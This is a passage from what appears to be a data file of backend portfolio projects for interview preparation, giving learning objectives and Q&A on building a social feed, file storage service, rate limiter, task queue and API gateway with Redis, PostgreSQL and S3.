    interviewRelevance: 'The "design a social media feed" question comes up in nearly every system design interview. Actually building one demonstrates you understand: fan-out strategies, feed generation, denormalization, caching, and real-time updates. The fan-out decision is the centerpiece of the architecture and interviewers specifically test whether you understand the write amplification trade-off. Optimistic likes with rollback show mastery of responsive UI patterns. The follow graph and feed generation algorithm demonstrate graph database thinking. Denormalized counters cached in Redis show practical performance optimization. Infinite scroll with cursor-based pagination proves you understand the limitations of offset-based approaches. This project opens discussions about content ranking algorithms, abuse prevention, and horizontal scaling strategies.',
    learningObjectives: [
      'Implement a fan-out-on-write feed system using Redis sorted sets',
      'Build infinite scroll with cursor-based pagination and intersection observer',
      'Create an optimistic like/unlike system with rollback on failure',
      'Design a follow graph and use it to generate personalized timelines',
      'Implement denormalized counters (like_count, comment_count) with atomic Redis INCR/DECR operations',
      'Build image upload for posts using presigned S3 URLs or Cloudinary integration',
      'Create a comment system with nested replies, pagination, and real-time updates',
      'Handle the "new posts available" banner that appears when followed users post while you are scrolling',
      'Implement user profile pages showing their posts, follower count, and following count',
      'Design a hybrid fan-out strategy that handles both normal users and high-follower-count accounts',
    ],
    keyQuestions: [
      { question: 'Fan-out-on-write vs fan-out-on-read?', answer: 'Fan-out-on-write means when a user creates a post, the system immediately pushes that post ID into every follower feed cache (a Redis sorted set keyed by user ID, scored by timestamp). This makes reads instant (just ZREVRANGE on the user feed key) but writes are expensive: a user with 10,000 followers triggers 10,000 Redis writes per post. Fan-out-on-read means when a user loads their feed, the system queries all users they follow and merges their recent posts on the fly. Reads are slow (N queries for N followed users) but writes are instant (just insert the post into the database). The hybrid approach, used by Twitter, does fan-out-on-write for users with fewer than 10,000 followers and fan-out-on-read for celebrities. When a user loads their feed, it merges the pre-built cache (fan-out-on-write portion) with a real-time query for celebrity posts (fan-out-on-read portion). For a take-home project, implement pure fan-out-on-write and mention the hybrid approach in your documentation.' },
      { question: 'How do I implement infinite scroll?', answer: 'Place a sentinel div element at the bottom of the feed. Register an Intersection Observer on it with a root margin of 200px (triggers 200px before the sentinel enters the viewport for smoother experience). When the observer fires, check if a fetch is already in progress (loading flag) to prevent duplicate requests. If not loading, fetch the next page using cursor-based pagination: GET /api/feed?before=1700000000000&limit=20 where the cursor is the created_at timestamp of the last loaded post. The server returns posts WHERE created_at < cursor ORDER BY created_at DESC LIMIT 20. Append the results to the existing feed array. If the response returns fewer than 20 items, set a hasMore flag to false and stop observing. For new posts that arrive while the user is scrolling, do not inject them into the feed (which causes jarring scroll jumps). Instead, show a "New posts" banner at the top that scrolls to the top and loads fresh content when clicked.' },
      { question: 'How should likes work?', answer: 'Implement optimistic likes for instant feedback. On click: immediately toggle the heart icon to filled/red and increment the displayed like count by one. In the background, send POST /api/posts/:id/like (or DELETE for unlike). If the request fails (network error or 409 conflict), rollback the UI: toggle the heart back and decrement the count. On the server: INSERT INTO likes (user_id, post_id) with a unique constraint on (user_id, post_id). If the INSERT violates the constraint (already liked), return 409. For the unlike path: DELETE FROM likes WHERE user_id = $1 AND post_id = $2. After the like/unlike, atomically update the denormalized like_count on the posts table: UPDATE posts SET like_count = like_count + 1 WHERE id = $1. Cache like counts in Redis using INCR/DECR for fast reads on the feed endpoint. Also cache the set of post IDs the current user has liked (SADD user:{id}:likes postId) so the feed endpoint can mark which posts are liked without N+1 queries.' },
      { question: 'What database schema is needed?', answer: 'Five core tables. users: id, email, username (unique), display_name, avatar_url, bio, follower_count (denormalized), following_count (denormalized), created_at. posts: id, user_id (FK), content (TEXT, max 280 chars for Twitter-style or unlimited for Instagram-style), image_url, like_count (denormalized integer), comment_count (denormalized integer), created_at. likes: user_id + post_id (composite PK), created_at. comments: id, post_id (FK), user_id (FK), content, parent_comment_id (nullable, for nested replies), created_at. follows: follower_id + following_id (composite PK), created_at. Critical indexes: posts(user_id, created_at DESC) for profile page queries, follows(follower_id) for feed generation (which users do I follow?), follows(following_id) for follower list, and comments(post_id, created_at) for comment loading. The denormalized counts (like_count, comment_count, follower_count) are updated atomically with the like/comment/follow operations to avoid COUNT(*) queries on every feed load.' },
      { question: 'How do I handle image uploads for posts?', answer: 'Use presigned S3 URLs for direct client-to-S3 uploads, which avoids routing large image files through your backend server. The flow: 1) Client calls POST /api/uploads/presign with the file type (image/jpeg). 2) Server generates a presigned PUT URL with a 5-minute expiry and a unique S3 key (uploads/{userId}/{uuid}.jpg), returns the presigned URL and the final public URL. 3) Client uploads the image directly to S3 using a PUT request with the presigned URL. 4) Client creates the post with POST /api/posts including the image URL. For image optimization, either use an S3 event trigger to generate thumbnails via a Lambda function, or use Cloudinary which handles resizing, format conversion (WebP), and CDN delivery automatically. Display a preview of the image in the post composer before upload completes, using URL.createObjectURL() on the local file.' },
      { question: 'How do I build the follow/unfollow system?', answer: 'Follow and unfollow are symmetric operations on the follows junction table. POST /api/users/:id/follow inserts a row (follower_id = currentUser, following_id = targetUser) and atomically increments follower_count on the target user and following_count on the current user. DELETE /api/users/:id/follow removes the row and decrements both counts. Use a unique constraint on (follower_id, following_id) to prevent duplicate follows. After a follow, if using fan-out-on-write, backfill the new follower feed with the followed user recent posts: query their last 50 posts and ZADD them to the follower Redis feed sorted set. On unfollow, remove those posts from the feed: ZREM each post ID. For the frontend, use an optimistic update: immediately toggle the Follow/Unfollow button state and update the displayed follower count, rolling back on API failure. Display a suggestion list of users to follow based on mutual connections (users followed by people you follow who you do not already follow), computed with a SQL query joining the follows table against itself.' },
    ],
  },
  {
    id: 'file-storage-service',
    title: 'File Storage Service',
    icon: 'upload',
    color: '#14b8a6',
    difficulty: 'advanced',
    estimatedTime: '7-9 hours',
    techStack: ['Node.js', 'Express', 'S3/MinIO', 'PostgreSQL', 'React', 'Redis'],
    questions: 6,
    description: 'Build a Dropbox-style file storage service with upload, download, sharing, preview, folder management, and storage quotas.',
    introduction: 'Create a file management application. Users upload files to S3-compatible storage, organize them in folders, share via public links with expiration, preview images/PDFs inline, and monitor storage usage against their quota.\n\nFile storage services are deceptively complex. Beyond basic upload and download, you need to handle: presigned URLs for direct client-to-S3 uploads that bypass your server, chunked uploads for large files with progress tracking and resume capability, a folder hierarchy modeled in a relational database with recursive queries, file sharing with expiration and password protection, and storage quota enforcement with atomic Redis counters.\n\nThis project exercises cloud infrastructure skills that are increasingly important for modern engineering roles. Working with S3 (or the compatible MinIO for local development) teaches you about object storage patterns, presigned URL security, content-type handling, and multipart uploads. The folder hierarchy uses PostgreSQL recursive CTEs, which are one of the most powerful and least understood features of SQL.\n\nFor interviews, this project is highly relevant to cloud-focused roles at companies like AWS, Dropbox, Google, and Box. It demonstrates S3 integration, streaming file handling, access control design, and quota enforcement, all of which are common system design interview topics.',
    interviewRelevance: 'Tests cloud storage integration (S3 presigned URLs), file streaming, chunked uploads for large files, access control (public/private/shared), and quota enforcement. Relevant for any cloud-focused role. Presigned URL usage demonstrates understanding of S3 security model and temporary credential patterns. Chunked uploads show knowledge of multipart upload protocols and resumability. The folder hierarchy with recursive CTEs demonstrates advanced SQL skills. File sharing with expiration and password protection tests access control design. Quota enforcement with atomic Redis counters shows distributed state management. This project opens discussions about CDN integration, virus scanning pipelines, and deduplication strategies.',
    learningObjectives: [
      'Implement S3 file operations: presigned upload URLs, direct download, and deletion',
      'Build chunked upload for large files with progress tracking and resume capability',
      'Create a sharing system with expiring public links and password protection',
      'Implement folder hierarchy with breadcrumb navigation and recursive operations',
      'Use MinIO as a local S3-compatible development environment with Docker',
      'Enforce storage quotas with atomic Redis INCRBY/DECRBY operations for consistent tracking',
      'Build file preview for images, PDFs, and text files without downloading the full file',
      'Implement file type validation and virus scanning integration for uploaded content',
      'Handle content-type detection and proper Content-Disposition headers for downloads',
      'Design a trash/recycle bin system with soft delete and automatic permanent deletion after 30 days',
    ],
    keyQuestions: [
      { question: 'How should I handle file uploads?', answer: 'Use a two-tier approach based on file size. For files under 5MB, the client can upload directly to your server, which streams the file to S3 using the AWS SDK putObject with a ReadableStream body so the file is never fully buffered in server memory. For files over 5MB, use presigned URLs for direct client-to-S3 uploads. The flow: client calls POST /api/files/upload-url with filename, content-type, and size. Server validates the content-type against an allowlist, checks the user quota has enough remaining space, generates a presigned PUT URL with a 15-minute expiry, and returns it along with a pending file record ID. Client uploads directly to S3 using the presigned URL with a PUT request, tracking upload progress via XMLHttpRequest onprogress event. After the upload completes, client calls POST /api/files/confirm with the pending file ID, and the server verifies the S3 object exists and finalizes the file record. This approach keeps large files off your server entirely.' },
      { question: 'How do I implement file sharing?', answer: 'Generate a share link with a random UUID token. Store the share record in a shares table: file_id, created_by (user ID), token (unique index), expires_at (nullable, defaults to 7 days), password_hash (nullable, bcrypt hashed), download_count (integer default 0), max_downloads (nullable, for limited-use links). The share URL is /share/:token. When someone accesses the URL: verify the token exists and is not expired, check download_count against max_downloads if set, prompt for password if password_hash is set and verify with bcrypt.compare, then generate a short-lived presigned S3 download URL (5 minute TTL) and redirect. Increment download_count atomically. Provide a management UI where the file owner can see all active shares, revoke them, update expiration, or add/remove passwords.' },
      { question: 'How do I build the folder hierarchy?', answer: 'Use the adjacency list model in PostgreSQL. The files table has columns: id, user_id, name, is_folder (boolean), parent_folder_id (nullable FK to self, NULL means root level), size (0 for folders), s3_key, content_type, created_at. Query children of a folder: SELECT * FROM files WHERE parent_folder_id = :folderId AND user_id = :userId ORDER BY is_folder DESC, name ASC (folders first, then files alphabetically). Build the breadcrumb by recursively fetching parents: WITH RECURSIVE ancestors AS (SELECT * FROM files WHERE id = :currentFolderId UNION ALL SELECT f.* FROM files f JOIN ancestors a ON f.id = a.parent_folder_id) SELECT * FROM ancestors. For recursive operations like calculating folder size or deleting a folder with all contents, use recursive CTEs: WITH RECURSIVE tree AS (SELECT id FROM files WHERE id = :folderId UNION ALL SELECT f.id FROM files f JOIN tree t ON f.parent_folder_id = t.id) DELETE FROM files WHERE id IN (SELECT id FROM tree). Also delete the corresponding S3 objects for each file in the tree.' },
      { question: 'How do I enforce storage quotas?', answer: 'Track storage usage in two places for consistency and performance. In PostgreSQL: the canonical source of truth, computed as SELECT SUM(size) FROM files WHERE user_id = :userId. In Redis: a cached counter (INCRBY user:{id}:storage fileSize on upload, DECRBY on delete) for fast pre-upload checks. Before accepting an upload, check the Redis counter: if current_usage + file_size > quota_limit, reject with 413 Payload Too Large and a message including the remaining available space. After successful upload, INCRBY the Redis counter atomically. On file deletion, DECRBY atomically. Run a background reconciliation job hourly that recomputes the PostgreSQL SUM and updates the Redis counter to correct any drift from race conditions or failed operations. Provide a storage usage bar in the UI showing percentage used with color thresholds: green under 75%, yellow 75-90%, red above 90%.' },
      { question: 'How do I implement file preview?', answer: 'Support inline preview for common file types without downloading the entire file. For images (JPEG, PNG, GIF, WebP): generate a presigned S3 URL and render in an img tag. Generate thumbnails using a Lambda function triggered by S3 upload events, storing the thumbnail at a separate S3 key (thumbs/{fileId}.jpg). For PDFs: use a presigned URL with the PDF.js viewer embedded in an iframe, or generate page thumbnails server-side. For text files and code: fetch the first 100KB of content using S3 Range header (Range: bytes=0-102400) and render with syntax highlighting based on the file extension. For video: generate a presigned URL and use the native HTML5 video player. For unsupported types: show a generic file icon with metadata (name, size, type, uploaded date) and a download button. The preview should open in a modal overlay that preserves the file browser context.' },
      { question: 'How do I implement a trash system?', answer: 'Instead of immediately deleting files, implement soft delete with a trash folder. Add a deleted_at (nullable timestamptz) column to the files table. When a user deletes a file, set deleted_at = NOW() instead of removing the row. Filter all normal queries with WHERE deleted_at IS NULL. The trash view queries WHERE deleted_at IS NOT NULL AND user_id = :userId ORDER BY deleted_at DESC. Provide two actions in the trash view: Restore (set deleted_at back to NULL) and Delete Permanently (remove the database row and delete the S3 object). Run a scheduled job daily that permanently deletes files where deleted_at is older than 30 days: query the rows, delete S3 objects in batch (deleteObjects API for up to 1000 objects per call), then delete the database rows. Trashed files should still count toward the user storage quota to prevent abuse, but show as a separate "Trash: X MB" indicator in the storage usage bar.' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // SYSTEM DESIGN IMPLEMENTATION
  // ═══════════════════════════════════════════════════════════
  {
    id: 'rate-limiter-service',
    title: 'Rate Limiter Service',
    icon: 'shield',
    color: '#06b6d4',
    difficulty: 'intermediate',
    estimatedTime: '4-5 hours',
    techStack: ['Node.js', 'Redis', 'Express', 'TypeScript', 'Lua'],
    questions: 6,
    description: 'Build a distributed rate limiter supporting multiple algorithms (Token Bucket, Sliding Window, Fixed Window) with per-client and per-endpoint rules.',
    introduction: 'Implement the rate limiting system you discuss in system design interviews. Build configurable rate limiters using Redis for distributed state. Support multiple algorithms, per-client rules, and a dashboard showing current usage and throttled requests.\n\nRate limiting is one of the most commonly asked system design topics, yet most candidates can only describe algorithms at a conceptual level. Building a working distributed rate limiter forces you to confront the real challenges: atomic read-modify-write operations in Redis using Lua scripts, choosing between algorithms with different precision/memory trade-offs, designing a flexible configuration system, and returning standardized rate limit headers.\n\nThe project exercises Redis at a deeper level than most applications ever touch. You will write Lua scripts that execute atomically inside Redis, use sorted sets for sliding window logs, and implement the token bucket refill calculation with precision timing. These are skills that transfer directly to building any distributed system component.\n\nFor interviews, being able to walk through a working implementation of three different rate limiting algorithms, explain their trade-offs with concrete memory and precision numbers, and show a monitoring dashboard that tracks usage and throttled requests transforms a theoretical system design answer into a credible engineering demonstration.',
    interviewRelevance: 'Rate limiting is asked in almost every system design interview. Building one proves you understand the algorithms deeply, not just "use a token bucket" but the actual implementation with Redis atomic operations, race condition handling, and distributed coordination. Token Bucket implementation shows you understand token refill math and burst capacity management. Sliding window algorithms demonstrate precision vs memory trade-offs. Lua scripts for atomicity show Redis expertise beyond basic GET/SET. The configuration system with rule matching shows API gateway design thinking. Rate limit headers following the IETF draft standard show awareness of API design best practices. This project naturally extends into discussions about DDoS protection, API monetization tiers, and global rate limiting across data centers.',
    learningObjectives: [
      'Implement Token Bucket algorithm using Redis with atomic Lua scripts',
      'Implement Sliding Window Log and Sliding Window Counter algorithms',
      'Build configurable per-client and per-endpoint rate limit rules',
      'Handle distributed race conditions with Redis MULTI/EXEC or Lua scripts',
      'Create a monitoring dashboard showing rate limit usage and throttled requests',
      'Return standardized rate limit headers (X-RateLimit-Limit, Remaining, Reset, Retry-After)',
      'Design a rule matching system with specificity ordering (exact endpoint over wildcard over default)',
      'Build a fixed window counter algorithm as the simplest baseline implementation',
      'Implement graceful degradation when Redis is unavailable (fail open vs fail closed decision)',
      'Create load tests that verify rate limiting works correctly under concurrent request pressure',
    ],
    keyQuestions: [
      { question: 'How does Token Bucket work in Redis?', answer: 'The Token Bucket algorithm models a bucket that holds tokens up to a maximum capacity (the burst limit) and refills at a fixed rate. Store two Redis keys per client: bucket:{clientId}:tokens (float, current token count) and bucket:{clientId}:last_refill (Unix timestamp in milliseconds). On each request, a Lua script executes atomically: 1) Read current tokens and last_refill timestamp. 2) Calculate elapsed time since last refill in seconds. 3) Add refilled tokens: tokens = min(maxTokens, tokens + elapsed * refillRate). 4) If tokens >= 1.0, consume one token (tokens -= 1), update both keys, return ALLOWED with remaining tokens. 5) If tokens < 1.0, return REJECTED with time until next token (1.0 - tokens) / refillRate. The Lua script ensures the entire read-calculate-write sequence is atomic, preventing two concurrent requests from both consuming the last token. Return the remaining tokens and reset time in the X-RateLimit-Remaining and X-RateLimit-Reset headers.' },
      { question: 'Sliding Window Log vs Counter?', answer: 'Sliding Window Log stores every request timestamp in a Redis sorted set (ZADD window:{clientId} timestamp timestamp). To check the limit: ZREMRANGEBYSCORE to remove entries older than the window, then ZCARD to count remaining entries. If count exceeds the limit, reject. Precision is perfect but memory grows linearly with request volume (1 million requests per minute = 1 million sorted set entries per client). Sliding Window Counter splits time into fixed windows (say, 1-minute buckets) and stores a counter per bucket. To estimate the current sliding window count, use a weighted average: count = previousWindow * (1 - elapsed/windowSize) + currentWindow. This is less precise (can allow up to 2x the limit at window boundaries in the worst case) but uses O(1) memory per client regardless of request volume. For most production use cases, the counter approach is sufficient and dramatically more memory-efficient.' },
      { question: 'How do I handle distributed coordination?', answer: 'Redis is single-threaded and processes commands sequentially, so individual commands are inherently atomic. But rate limiting algorithms require multi-step read-modify-write operations: read the current count, check against the limit, and update the count. If you implement this as separate Redis commands, two concurrent requests can both read count=99 (limit=100), both decide to allow, and both write count=100, exceeding the limit. Lua scripts solve this: the entire script executes atomically inside Redis with no interleaving from other clients. Write the Token Bucket logic as a single Lua script that reads, calculates, decides, updates, and returns the result. Redis EVAL sends the script to the server for execution. Cache the script with SCRIPT LOAD and call with EVALSHA for better performance. An alternative is MULTI/EXEC transactions, but they do not support conditional logic (you cannot branch based on the token count), making Lua scripts the only viable option for rate limiting.' },
      { question: 'How should the configuration system work?', answer: 'Define rules as a table: { id, endpoint_pattern, client_type, algorithm, rate, window_seconds, burst_capacity }. Example rules: { pattern: "/api/auth/*", type: "anonymous", algorithm: "sliding_window_counter", rate: 10, window: 900 } (10 auth attempts per 15 minutes), { pattern: "/api/*", type: "free", algorithm: "token_bucket", rate: 60, window: 60, burst: 80 } (60 requests/minute with burst to 80). Match incoming requests by specificity: exact endpoint match takes priority over wildcard, which takes priority over default. Client type is determined by the authentication middleware (anonymous, free, paid, admin). Store rules in PostgreSQL for persistence with a Redis cache layer. Reload the Redis cache on rule changes via a webhook or polling interval. When a request arrives, the middleware resolves the best matching rule and delegates to the corresponding algorithm implementation.' },
      { question: 'What headers should the response include?', answer: 'Follow the IETF RateLimit header draft standard. On every response (both allowed and rejected), include: X-RateLimit-Limit (the maximum number of requests allowed in the current window, for example 100), X-RateLimit-Remaining (the number of requests remaining in the current window, for example 73), X-RateLimit-Reset (Unix timestamp in seconds when the window resets or when the next token will be available). On 429 Too Many Requests responses, additionally include: Retry-After (number of seconds the client should wait before retrying, for example 12). The response body should include a JSON error: { error: "Rate limit exceeded", retryAfter: 12 }. These headers allow well-behaved API clients to implement intelligent retry logic with backoff, and they are the standard that API consumers expect from production services like GitHub, Stripe, and Cloudflare.' },
      { question: 'How do I handle Redis unavailability?', answer: 'When Redis is down, the rate limiter must make a policy decision: fail open (allow all requests, losing rate limit protection) or fail closed (reject all requests, causing a service outage). For most applications, fail open is the correct choice: a brief period without rate limiting is preferable to a complete API outage. Implement a circuit breaker around Redis calls: if Redis connection fails, log a warning, set a circuit open flag, and skip rate limit checks for a cooldown period (30 seconds). After the cooldown, attempt a test Redis call (half-open state). If it succeeds, close the circuit and resume normal rate limiting. For critical security-sensitive endpoints (login, password reset), consider an in-memory fallback rate limiter using a Map with periodic cleanup. The in-memory limiter is not distributed (each server instance has its own counters) but provides basic protection when Redis is unavailable.' },
    ],
  },
  {
    id: 'distributed-task-queue',
    title: 'Distributed Task Queue',
    icon: 'activity',
    color: '#f97316',
    difficulty: 'advanced',
    estimatedTime: '7-9 hours',
    techStack: ['Node.js', 'Redis', 'Bull/BullMQ', 'PostgreSQL', 'React', 'WebSocket'],
    questions: 6,
    description: 'Build a distributed task queue with priority scheduling, retries with exponential backoff, dead letter queues, and a monitoring dashboard.',
    introduction: 'Create a Celery/Sidekiq-style task processing system. Producers enqueue tasks with priority and metadata. Workers consume tasks, process them, and report results. Handle failures with configurable retry policies, dead letter queues for poison messages, and a web dashboard for monitoring.\n\nDistributed task queues are the backbone of every production backend system. They handle email sending, image processing, payment reconciliation, report generation, and any operation too slow or unreliable to run synchronously in an HTTP request handler. Building one from scratch (or deeply customizing BullMQ) teaches you the fundamental patterns that power systems like Celery, Sidekiq, RabbitMQ, and AWS SQS.\n\nThe engineering challenges are substantial: ensuring at-least-once delivery when workers crash, implementing priority scheduling that does not starve low-priority tasks, designing retry policies with exponential backoff and jitter to prevent thundering herd, routing failed tasks to dead letter queues for manual inspection, and building a real-time monitoring dashboard that shows queue health at a glance.\n\nFor interviews, task queue architecture comes up in nearly every system design discussion. Being able to reference a working implementation of reliable delivery, retry policies, idempotency patterns, and monitoring dashboards gives you concrete answers to questions that most candidates can only address theoretically.',
    interviewRelevance: 'Message queues and async processing come up in nearly every system design interview. Building one demonstrates understanding of: producer-consumer patterns, at-least-once delivery, idempotency, backpressure, and distributed worker coordination. The reliable delivery mechanism with RPOPLPUSH shows Redis expertise beyond basic caching. Exponential backoff with jitter demonstrates awareness of distributed system failure modes. Dead letter queues show operational maturity. Priority scheduling shows algorithm knowledge applied to infrastructure. The monitoring dashboard demonstrates observability thinking. This project opens discussions about exactly-once delivery semantics, message ordering guarantees, horizontal worker scaling, and comparison with managed services like SQS and Cloud Tasks.',
    learningObjectives: [
      'Implement a priority queue using Redis sorted sets or BullMQ',
      'Build worker processes that consume, process, and acknowledge tasks',
      'Implement retry policies: exponential backoff, max retries, dead letter queue',
      'Create a monitoring dashboard with queue depth, throughput, and failure rates',
      'Design a reliable delivery mechanism that handles worker crashes without losing tasks',
      'Implement task deduplication using idempotency keys to prevent duplicate processing',
      'Build a scheduled task system that enqueues tasks at a future time (delayed jobs)',
      'Add backpressure mechanisms that slow down producers when queue depth exceeds thresholds',
      'Create worker concurrency controls with configurable parallelism per worker instance',
      'Implement task progress reporting so long-running tasks can stream percentage complete to the dashboard',
    ],
    keyQuestions: [
      { question: 'How do I implement reliable task delivery?', answer: 'The core pattern is atomic move from the waiting queue to a processing queue. Use Redis BRPOPLPUSH (blocking right-pop, left-push): this atomically removes a task from the right end of the waiting list and pushes it to the left end of a processing list, all in one command. If the worker crashes after popping but before completing, the task remains in the processing list. A separate monitor process scans the processing list every 30 seconds: any task that has been there longer than a visibility timeout (for example, 5 minutes) is moved back to the waiting queue for reprocessing. BullMQ implements this exact pattern internally with additional features like job lifecycle events and stalled job detection. The result is at-least-once delivery: every task is processed at least once, but may be processed more than once if the worker crashes after completing but before acknowledging. This is why idempotent task handlers are critical.' },
      { question: 'How does exponential backoff work?', answer: 'On task failure, calculate the retry delay using the formula: delay = min(baseDelay * 2^(attemptNumber - 1), maxDelay) + randomJitter. With baseDelay = 1000ms and maxDelay = 3600000ms (1 hour): attempt 1 retries after 1 second, attempt 2 after 2 seconds, attempt 3 after 4 seconds, attempt 4 after 8 seconds, attempt 5 after 16 seconds, and so on, capping at 1 hour. The random jitter (a random value between 0 and 1000ms) is critical: without it, if 100 tasks fail simultaneously (for example, because an external API went down), they all retry at exactly the same times, creating a thundering herd that overwhelms the recovering service. Jitter spreads the retries across the delay window. After maxRetries (typically 3-5) are exhausted, move the task to the dead letter queue with the failure reason, all retry timestamps, and the original task payload for manual inspection.' },
      { question: 'What is a dead letter queue?', answer: 'A dead letter queue (DLQ) is a separate queue where tasks are sent after all retry attempts are exhausted. Instead of discarding failed tasks, which loses data and makes debugging impossible, the DLQ preserves them for manual inspection. Each DLQ entry stores: the original task payload, the queue it came from, the failure reason and stack trace from the final attempt, timestamps of all retry attempts, and the worker ID that last processed it. An admin dashboard lets operators browse the DLQ, inspect individual entries, fix the underlying issue (maybe a bug in the task handler or an external service that was down), and re-queue selected tasks back to the main queue. You can also build automated DLQ alerts: if the DLQ depth exceeds a threshold, trigger a PagerDuty alert. The DLQ is a hallmark of production-grade queue systems and interviewers specifically look for it in system design answers.' },
      { question: 'How should the monitoring dashboard work?', answer: 'Build a real-time dashboard with WebSocket updates showing: queue depth (number of waiting tasks, displayed as a gauge that turns yellow above 1000 and red above 5000), processing count (number of tasks currently being processed by workers), completed per minute (throughput line chart over the last hour), failed per minute (error rate line chart), average processing time (latency gauge with P50, P95, P99 percentiles), and dead letter queue depth. The backend collects metrics by subscribing to BullMQ job events (completed, failed, stalled) and aggregating them in Redis time-series keys (HINCRBY metrics:completed:{minute} count 1). The dashboard connects via WebSocket and receives metric updates every 5 seconds. Add alert rules: if queue depth exceeds the threshold for 5 consecutive minutes, if error rate exceeds 5% for 3 minutes, or if average latency exceeds the SLA. Display alerts as persistent banners until acknowledged.' },
      { question: 'How do I implement task prioritization?', answer: 'Use Redis sorted sets where the score represents priority (lower score = higher priority). ZADD task_queue score taskId stores each task with a priority value. Workers consume tasks with ZPOPMIN which atomically removes and returns the lowest-scored (highest-priority) member. For combined priority and FIFO ordering within the same priority level, encode the score as priority * 10^13 + timestamp, which ensures tasks with the same priority are processed in order of submission. BullMQ supports priority natively: queue.add("taskName", data, { priority: 1 }). Priority 1 tasks are always processed before priority 2. Be careful about starvation: if high-priority tasks arrive continuously, low-priority tasks may never be processed. Implement a weighted fair queue that processes high-priority tasks 80% of the time and low-priority 20%, or promote tasks that have waited longer than a threshold.' },
      { question: 'How do I make task handlers idempotent?', answer: 'At-least-once delivery means a task might be processed more than once if the worker crashes after completing but before acknowledging. Idempotent handlers produce the same result regardless of how many times they run. Three strategies: 1) Idempotency keys: each task includes a unique key (for example, a UUID). Before processing, check a Redis SET or database table for the key. If present, skip processing and return success. After processing, add the key with a TTL (for example, 7 days). 2) Database constraints: if the task inserts a record, use an upsert (INSERT ON CONFLICT DO NOTHING) with a unique constraint on the business key. Duplicate processing is harmless because the second insert is a no-op. 3) Exactly-once via transactions: wrap the task processing and the acknowledgment in a database transaction, so either both happen or neither does. Strategy 1 is the most general and works for any side effect including external API calls. Always design task handlers to be idempotent from the start; retrofitting idempotency is much harder.' },
    ],
  },
  {
    id: 'api-gateway',
    title: 'API Gateway',
    icon: 'globe',
    color: '#6366f1',
    difficulty: 'advanced',
    estimatedTime: '7-9 hours',
    techStack: ['Node.js', 'Express', 'Redis', 'Docker', 'TypeScript', 'Lua'],
    questions: 6,
    description: 'Build an API gateway with request routing, authentication, rate limiting, response caching, circuit breaker, and request/response transformation.',
    introduction: 'Create a Kong/AWS API Gateway-style service. Route incoming requests to backend microservices based on path and headers. Add cross-cutting concerns: JWT authentication, rate limiting per client, response caching, circuit breaker for failing upstreams, and request logging.\n\nAPI gateways are the front door of every microservices architecture. They centralize cross-cutting concerns so individual services do not need to implement authentication, rate limiting, caching, and logging independently. Building one teaches you how requests flow through a production system and how each middleware layer adds value.\n\nThe middleware chain architecture is the core design pattern: each incoming request passes through a pipeline of auth, rate limit, cache, circuit breaker, and proxy stages. Each stage can short-circuit the pipeline (cache hit returns immediately, rate limit returns 429, circuit breaker returns 503) or enrich the request (auth adds user context, logging adds request ID). This pipeline pattern appears in every HTTP framework and understanding it deeply is essential for backend engineering.\n\nFor senior engineering interviews, API gateway architecture is a staple topic. Being able to explain and demonstrate: route matching with specificity, circuit breaker state machines, cache key generation and invalidation, and request/response transformation gives you concrete answers that distinguish you from candidates who can only draw boxes on a whiteboard.',
    interviewRelevance: 'API gateways appear in every microservices architecture discussion. Building one demonstrates understanding of: reverse proxying, middleware chains, service discovery, circuit breakers, and centralized auth, all critical for senior engineering interviews. Route matching with specificity shows algorithm design thinking. The circuit breaker state machine demonstrates fault tolerance patterns. Response caching with key generation and invalidation shows distributed caching mastery. Request transformation shows header and body manipulation skills. The middleware chain architecture demonstrates the pipeline design pattern that underpins every HTTP framework. This project opens discussions about service mesh vs API gateway, sidecar proxy patterns, and blue-green deployment routing.',
    learningObjectives: [
      'Build a reverse proxy that routes requests to upstream services based on configuration',
      'Implement a middleware chain: auth, rate limit, cache, circuit breaker, proxy',
      'Create a circuit breaker with half-open state and gradual recovery',
      'Add response caching with cache-key generation and invalidation',
      'Generate unique request IDs (X-Request-ID) and propagate them through the entire chain',
      'Implement request and response logging with structured JSON for observability',
      'Build health check endpoints that aggregate upstream service health status',
      'Add request body streaming so large payloads are proxied without buffering in memory',
      'Implement weighted round-robin load balancing across multiple upstream instances',
      'Create a configuration hot-reload system that applies route changes without restarting the gateway',
    ],
    keyQuestions: [
      { question: 'How does request routing work?', answer: 'Define routes as a JSON configuration: { path: "/api/users/*", upstream: "http://user-service:3001", methods: ["GET", "POST"], stripPrefix: "/api", auth: true, rateLimit: { rate: 100, window: 60 }, cache: { ttl: 300 }, circuitBreaker: { threshold: 0.5, timeout: 30 } }. On each incoming request, match against routes by path prefix using longest prefix match (exact match takes priority over wildcard). Forward the request using Node http.request, preserving the original method, headers (except hop-by-hop headers like Connection and Transfer-Encoding), and body. Stream the request body directly to the upstream without buffering (pipe req to the upstream request). Stream the upstream response back to the client (pipe upstream response to res). Preserve the upstream status code and headers, adding gateway-specific headers like X-Request-ID and X-Upstream-Latency. For path rewriting, strip the configured prefix before forwarding: if stripPrefix is "/api" and the incoming path is "/api/users/123", forward as "/users/123".' },
      { question: 'How does the circuit breaker work?', answer: 'The circuit breaker has three states: Closed (normal operation, requests pass through), Open (all requests fail fast with 503 Service Unavailable without touching the upstream), and Half-Open (a limited number of test requests are allowed through to check if the upstream has recovered). Track failure rate per upstream service using a sliding window of the last N requests (for example, 20). In the Closed state: if the failure rate exceeds a threshold (for example, 50% failures), transition to Open. In the Open state: immediately return 503 for all requests to that upstream. Set a timeout (for example, 30 seconds) after which the circuit transitions to Half-Open. In the Half-Open state: allow one test request through. If it succeeds, transition back to Closed and reset the failure counter. If it fails, transition back to Open and restart the timeout. Count only 5xx responses and connection timeouts as failures, not 4xx client errors. Store circuit state in Redis so it is shared across multiple gateway instances.' },
      { question: 'How should caching work?', answer: 'Generate a cache key from the request: hash(method + path + sorted query parameters + relevant headers like Accept and Authorization). Use a fast hash like SHA-256 truncated to 16 characters. Store the cached response in Redis with key cache:{hash}, value as JSON containing statusCode, headers, and body, with a TTL derived from the upstream Cache-Control header or the route configuration default. On each request, check Redis for a cache hit before proxying to the upstream. On hit, return the cached response immediately with an X-Cache: HIT header. On miss, proxy to the upstream, store the response in Redis with the appropriate TTL, and return with X-Cache: MISS. Support cache invalidation via: PURGE requests that delete a specific cache key, tag-based invalidation where each cached entry is associated with tags (SADD cache:tag:users cacheKey) and PURGE /tags/users deletes all entries in that tag set, and TTL-based automatic expiration. Skip caching for POST/PUT/DELETE requests and responses with Cache-Control: no-store.' },
